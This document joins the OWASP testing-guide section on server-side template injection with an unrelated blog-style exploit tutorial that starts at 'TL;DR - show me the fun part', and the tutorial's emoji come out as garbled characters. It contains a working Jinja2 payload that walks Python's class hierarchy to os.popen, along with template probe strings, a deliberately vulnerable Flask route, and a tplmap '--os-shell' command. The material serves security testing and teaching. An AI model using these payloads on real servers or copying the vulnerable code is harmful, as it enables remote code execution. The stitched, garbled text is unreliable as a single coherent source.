|WSTG-INPV-18|

## Summary

Web applications commonly use server-side templating technologies (Jinja2, Twig, FreeMaker, etc.) to generate dynamic HTML responses. Server-side Template Injection vulnerabilities (SSTI) occur when user input is embedded in a template in an unsafe manner and results in remote code execution on the server. Any features that support advanced user-supplied markup may be vulnerable to SSTI including wiki-pages, reviews, marketing applications, CMS systems etc. Some template engines employ various mechanisms (eg. sandbox, allow listing, etc.) to protect against SSTI.

### Example - Twig

The following example is an excerpt from the [Extreme Vulnerable Web Application](https://github.com/s4n7h0/xvwa) project.

```php
public function getFilter($name)
{
        [snip]
        foreach ($this->filterCallbacks as $callback) {
        if (false !== $filter = call_user_func($callback, $name)) {
            return $filter;
        }
    }
    return false;
}
```

In the getFilter function the `call_user_func($callback, $name)` is vulnerable to SSTI: the `name` parameter is fetched from the HTTP GET request and executed by the server:

![SSTI XVWA Example](images/SSTI_XVWA.jpeg)\
*Figure 4.7.18-1: SSTI XVWA Example*

### Example - Flask/Jinja2

The following example uses Flask and Jinja2 templating engine. The `page` function accepts a 'name' parameter from an HTTP GET request and renders an HTML response with the `name` variable content:

```python
@app.route("/page")
def page():
    name = request.values.get('name')
    output = Jinja2.from_string('Hello ' + name + '!').render()
    return output
```

This code snippet is vulnerable to XSS but it is also vulnerable to SSTI. Using the following as a payload in the `name` parameter:

```bash
$ curl -g 'http://www.target.com/page?name={{7*7}}'
Hello 49!
```

## Test Objectives

- Detect template injection vulnerability points.
- Identify the templating engine.
- Build the exploit.

## How to Test

SSTI vulnerabilities exist either in text or code context. In plaintext context users allowed to use freeform 'text' with direct HTML code. In code context the user input may also be placed within a template statement (eg. in a variable name)

### Identify Template Injection Vulnerability

The first step in testing SSTI in plaintext context is to construct common template expressions used by various template engines as payloads and monitor server responses to identify which template expression was executed by the server.

Common template expression examples:

```text
a{{bar}}b
a{{7*7}}
{var} ${var} {{var}} <%var%> [% var %]
```

In this step an extensive [template expression test strings/payloads list](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) is recommended.

Testing for SSTI in code context is slightly different. First, the tester constructs the request that result either blank or error server responses. In the example below the HTTP GET parameter is inserted info the variable `personal_greeting` in a template statement:

```text
personal_greeting=username
Hello user01
```

Using the following payload - the server response is blank "Hello":

```text
personal_greeting=username<tag>
Hello
```

In the next step is to break out of the template statement and injecting HTML tag after it using the following payload

```text
personal_greeting=username}}<tag>
Hello user01 <tag>
```

### Identify the Templating Engine

Based on the information from the previous step now the tester has to identify which template engine is used by supplying various template expressions. Based on the server responses the tester deduces the template engine used. This manual approach is discussed in greater detail in [this](https://portswigger.net/blog/server-side-template-injection?#Identify) PortSwigger article. To automate the identification of the SSTI vulnerability and the templating engine various tools are available including [Tplmap](https://github.com/epinna/tplmap) or the [Backslash Powered Scanner Burp Suite extension](https://github.com/PortSwigger/backslash-powered-scanner).

### Build the RCE Exploit

The main goal in this step is to identify to gain further control on the server with an RCE exploit by studying the template documentation and research. Key areas of interest are:

- **For template authors** sections covering basic syntax.
- **Security considerations** sections.
- Lists of built-in methods, functions, filters, and variables.
- Lists of extensions/plugins.

The tester can also identify what other objects, methods and properties can be exposed by focusing on the `self` object. If the `self` object is not available and the documentation does not reveal the technical details, a brute force of the variable name is recommended. Once the object is identified the next step is to loop through the object to identify all the methods, properties and attributes that are accessible through the template engine. This could lead to other kinds of security findings including privilege escalations, information disclosure about application passwords, API keys, configurations and environment variables, etc.

TL;DR - show me the fun part‚ùó

    Open the app

    Discover template injection ‚Äì>

    {{7*7}}

    Execute ‚Äúls‚Äù command ‚Äì>

    {{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}

    Get paid, maybe?

Sorry, your browser doesn't support embedded videos.
What is template‚ùì

In simple words, it‚Äôs an HTML file that contains variables. Something like

<h1>{{greeting}}!</h1>

Depending on the template type, a variable greeting is defined between {{ }}.

If we pass ‚Äúhello username‚Äù to greeting, then the HTML would be

<h1>hello username!</h1>

A common example is, when a user login into app, the app fetch the name of the user and pass it to greeting variable. The user will see

hello username!

So templates are used by backend app to render data dynamically into HTML.

Depending on the backend programming language, there are different types of web template. Such as Jinja2(Python), Twig(PHP), FreeMarker(Java).
What is server side template injection‚ùì

If the app blindly takes a user input (such as username) and render it into a template. Then the user can inject arbitrary code which the template will evaluate.

Such injection, will allow the user to access some APIs and methods which are not supposed to.

How to discover the flaw‚ùì

Usually manually, with trial and error. If we don‚Äôt know the type of the template engine, then we inject a set of various template syntax. Portswigger provides an extensive approach to spot the vulnerability with different template types.

For this demo, I will be using Python and Jinja template.

In Jinja, if you pass an operation like {{7*7}} and the app evaluated 7*7 and returned 49

<h1>49!</h1>

then the app is vulnerable to server side template injectionüéâ.
How is that exploitable‚ùì

So, after an attacker figures out template injection, then what?

The template evaluation happens on the server side. Meaning if the attacker somehow finds a way to make the template access the underlying operating system, the user can take over the server.

Let‚Äôs give it a try!

    Injecting direct os commands like ls or even using Python OS module;

    {{ ls }}

    {{ import os; os.system("ls") }}

    {{ import os }}

    ‚ùå Is not going to work in jinja. And if the web developer doesn‚Äôt handle exceptions properly, the app will return an exception like this one

jinja‚Äôs exception upon injecting Python import statement (click to enlarge)

So Jinja engine limits what we can inject. If we can‚Äôt import modules, then what can we do?

    let‚Äôs try with adding a simple Python datatype like a string

    {{"foo"}}

    ‚úÖ It gets evaluated as normal string foo.

    What if use a builtin methods for string, like convert to upper case

    {{"foo".upper()}}

    ‚úÖ It gets evaluated to uppercase: FOO

Knowing that we can access builtin Python methods, is there a way to take an advantage out of this‚ùì

If we can somehow access Python ‚Äòos‚Äô module using a string, then we can execute os commands.

Let‚Äôs find out if Python‚Äôs magic allows us to do so!
Remote Code execution üí•

Python is an Object Oriented Programming. It has objects, classes, class inheritance, ..etc.

Everything in Python is an object. When you create a string, try to print out its type, you will see it‚Äôs an object that belongs to class str

foo = "myString"
print(type(foo))
<class 'str'> # output

Since everything is an object, Python by default provides some builtin methods called magic methods (which starts and ends with double underscore) such as

__init__

We saw that we could access built methods (like "string".upper()).

üî• üí•What if i told you that injecting this Python snippet:

{{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}

will result with a remote code execution and the server will execute ‚Äúls‚Äù command and list back files and folders (play.py, static, template).
remote code execution result

I know that your first reaction will be üëá

Let me explain.

Remember that our end goal, is to get to ‚Äòos‚Äô module. To do so, we will be using the available magic methods.

Here‚Äôs a break down for the exploit,
jinja exploit (click to enlarge)

    Give me the class for ‚Äúfoo‚Äù string, it returns

    <class 'str'>

    Give me the name of the base class. In other words, give me the parent class that child class ‚Äòstr‚Äô inherits from, it returns

    <class 'object'>

    üëâ At this point, we are at class ‚Äòobject‚Äô level.

    Give me all the child classes that inherits ‚Äòobject‚Äô class, it returns a list

    [<class 'type'>, <class 'weakref'>, ....etc

    Give me the class that is located in index #182, this class is

    <class 'warnings.catch_warnings'>

    We chose this class, because it imports Python ‚Äòsys‚Äô module , and from ‚Äòsys‚Äô we can reach out to ‚Äòos‚Äô module.

    Give me the class constructor (__init__). Then call (__globals__) which returns a dictionary that holds the function‚Äôs global variables. From this dictionary, we just want [‚Äòsys‚Äô] key which points to the sys module,

    <module 'sys' (built-in)>

    üëâ At this point, we have reached the ‚Äòsys‚Äô module.

    ‚Äòsys‚Äô has a method called modules, it provides access to many builtin Python modules. We are just interested in ‚Äòos‚Äô,

    <module 'os' from '/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/os.py'>

    üëâ At this point, we have reached the ‚Äòos‚Äô module.

    Guess what. Now we can invoke any method provided from the ‚Äòos‚Äô module. Just like the way we do it form the Python interpreter console.

    So we execute os command ‚Äúls‚Äù using popen and read the outputüéâ.

Show me the source code of the vulnerable app üëÄ

    App gets user‚Äôs input via request parameter ‚Äòname‚Äô.

    Pass the untrusted user‚Äôs input directly to render_template_string method.

    Template engine, evaluates the exploit, causing SSTI.

@app.route("/", methods=['GET'])
def home():
    try:
        name = request.args.get('name') or None # get untrusted query param
        greeting = render_template_string(name) # render it into template

What tool did you use in the video‚ùì

tplmap. While no longer maintained, it still works!

python2.7 tplmap.py -u "http://127.0.0.1:5000/?name" --os-shell

For obvious security reasons, running this tool against online lab, won‚Äôt work.
